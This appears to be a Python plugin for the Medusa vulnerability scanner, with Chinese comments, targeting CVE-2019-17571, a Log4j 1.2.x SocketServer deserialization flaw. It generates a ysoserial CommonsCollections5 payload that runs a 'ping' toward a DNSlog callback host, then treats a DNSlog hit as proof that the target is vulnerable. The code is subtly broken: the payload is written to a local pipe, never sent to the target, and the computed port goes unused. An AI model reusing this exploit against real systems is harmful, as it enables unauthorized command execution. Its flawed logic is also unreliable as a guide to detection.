#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urllib.parse
import ClassCongregation
from ClassCongregation import Dnslog,Proxies,GetToolFilePath
import subprocess
import time
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2019-17571" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2020-1-7"  # 插件编辑时间
        self.info['disclosure']='2019-12-24'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Log4jRemoteCommandExecutionVulnerability"  # 插件名称
        self.info['name'] ='log4j远程命令执行漏洞' #漏洞名称
        self.info['affects'] = "Log4j"  # 漏洞组件
        self.info['desc_content'] = "Log4j1.2.x版本中的org.apache.log4j.net.SocketServer类，存在反序列化漏洞。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "1.2.4<=ApacheLog4j<=1.2.17"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=Proxies().result(proxies)

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        dns=Dnslog()
        YsoserialPath=GetToolFilePath().Result()+"ysoserial.jar"
        subprocess.Popen(["java", "-jar", YsoserialPath, "CommonsCollections5", "ping "+dns.dns_host()], stdout=subprocess.PIPE)
        time.sleep(5)
        if dns.result():
            Medusa = "{}存在log4j远程命令执行漏洞(CVE-2019-17571)\r\n漏洞地址:\r\n{}\r\n漏洞详情:\r\nDNSlog请求值{}\r\nDNSlog数据{}\r\n".format(url,scheme + "://" + url +":"+ str(port),dns.dns_host(),dns.dns_text())
            _t=VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l = ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类

